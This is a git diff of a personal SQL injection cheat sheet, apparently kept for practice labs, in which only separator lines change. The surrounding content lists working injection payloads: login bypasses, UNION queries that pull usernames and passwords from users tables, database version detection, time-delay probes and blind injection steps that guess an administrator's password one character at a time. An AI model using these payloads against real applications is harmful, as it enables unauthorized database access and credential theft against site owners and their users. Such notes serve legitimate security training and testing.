@@ -12,7 +12,7 @@ WHERE role = 'administrator';
 
 INSERT INTO users (username, password, email, role)
 VALUES ('tester', 'securepass', 'test@example.com', 'user'); 
-
+___________________________________________________________________________________________________________
 ### Database version ###
 
 Oracle:	SELECT banner FROM v$version
@@ -20,7 +20,7 @@ SELECT version FROM v$instance
 Microsoft:	SELECT @@version
 PostgreSQL:	SELECT version()
 MySQL:	SELECT @@version
-
+___________________________________________________________________________________________________________
 ### Database contents ###
 
 Oracle :	SELECT * FROM all_tables
@@ -34,7 +34,7 @@ SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
 
 MySQL	SELECT : * FROM information_schema.tables
 SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
-
+___________________________________________________________________________________________________________
 ``Simple Injections...``
     '
     '--
@@ -45,7 +45,7 @@ SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
     " OR "" = "
     " OR 1 = 1 -- -
     ' OR '' = '
-
+___________________________________________________________________________________________________________
 # REMEMBER THERE WILL BE MANY HEADCHES BEACUSE YOU NEED TO MAKE MODS FOR SUCCESS DEPENDING ON THE DATABASE #
 
 // to determine the columns available 
@@ -58,12 +58,12 @@ SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
                               modify it or add null
 1' ORDER BY 2--+   OR ' ORDER BY 2-- //I Don't use it most of the time
  
-            
+___________________________________________________________________________________________________________            
 //Database Version Detection ( depending on the database make mods.)
 '+UNION+SELECT+@@version,+NULL# 
 '+UNION+SELECT+BANNER,+NULL+FROM+@@version-- 
 ' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version, 0x7e))-- 
-
+___________________________________________________________________________________________________________
 //contents of the database ( add UNION, make mods, play with it)
 SELECT * FROM information_schema.tables
 SELECT * FROM information_schema.columns WHERE table_name = 'Table name'
@@ -73,7 +73,7 @@ SELECT * FROM information_schema.columns WHERE table_name = 'Table name'
 
 '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
 '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
-
+___________________________________________________________________________________________________________
 //if the databse returns one column
 ' UNION SELECT username, password FROM users-- 
 {' UNION SELECT NULL,username FROM users--}
@@ -84,19 +84,20 @@ SELECT * FROM information_schema.columns WHERE table_name = 'Table name'
 1 UNION SELECT 1 INTO @,@
 1 AND (SELECT * FROM Users) = 1	
 ')+union+select+1,sleep(10)--+-
-
+___________________________________________________________________________________________________________
 """   BLIND SQL INJECTIONS   """
 
 //determining which column exist, if it throws error then try 'a' --
 ' AND (SELECT 'a' FROM users LIMIT 1)='a
 ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
 ' AND (SELECT username FROM users WHERE username='administrator') = 'administrator' -- 
-  
+___________________________________________________________________________________________________________  
 //determing word count                                         
 ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a                                       
 ' AND (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>1) = 'administrator' -- 
-
+___________________________________________________________________________________________________________
 //determing password
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
 ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'admin'),1,1) = 'a' --
 ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'admin'),2,1) > 'm' --
+___________________________________________________________________________________________________________
